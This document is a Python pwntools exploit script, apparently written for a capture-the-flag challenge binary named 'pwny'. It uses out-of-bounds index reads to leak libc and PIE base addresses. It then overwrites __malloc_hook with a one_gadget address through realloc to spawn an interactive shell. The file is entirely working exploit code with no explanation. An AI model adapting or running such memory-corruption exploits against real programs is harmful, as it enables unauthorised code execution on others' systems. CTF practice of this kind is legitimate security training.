#coding:UTF-8
from pwn import *
# context.log_level = 'debug'
# p = remote('124.71.224.30',20990)
elf = ELF('./pwny')
p = elf.process()
# libc = ELF('libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
read_got = elf.got['read']
og = [0x4f3d5,0x4f432,0x10a41c]
# og = [0x4f365,0x4f3c2,0x10a45c]
p.recvuntil("Your choice:")
p.sendline('2')
p.sendline(str(0x100))
gdb.attach(p)
p.sendline('2')
p.sendline(str(0x100))
#p.sendline('2')
#p.sendline('0')
p.sendline('1')
p.send(p64(0xffffffffffffffe7))

p.recvuntil('Result: ')
libc_add = int(p.recvline().strip('\n'),16) - libc.sym['puts']
info (hex(libc_add))
onegg = libc_add + og[1]
# vtab = libc_add + 
# p.sendline('2')
# p.sendline('1'*0x100)
malloc_hook = libc_add + libc.sym['__malloc_hook']
realloc = libc_add + libc.sym['realloc']
system = libc_add + libc.sym['system']
info("system: " + hex(system))
info("malloc_hook: " + hex(malloc_hook))
info("realloc: " + hex(realloc))
p.sendline('1')
# gdb.attach(p,"b *$rebase(0xb5c)")
p.sendline(p64(0xfffffffffffffff5))
p.recvuntil('Result: ')
pie_base = int(p.recvline().strip('\n'),16) - 0x202008
info (hex(pie_base))
start = pie_base + 0x202060
idx = (malloc_hook - 8 - start)//8
p.sendline('2')
p.sendline(str(idx))

p.send(p64(onegg))
p.sendline('2')
p.sendline(str((malloc_hook - start)//8))
p.send(p64(realloc+8))
# p.send(p64(system))
# gdb.attach(p,"b *$rebase(0x202060)")
# raw_input()
p.sendline('1'*0x1000)

p.interactive()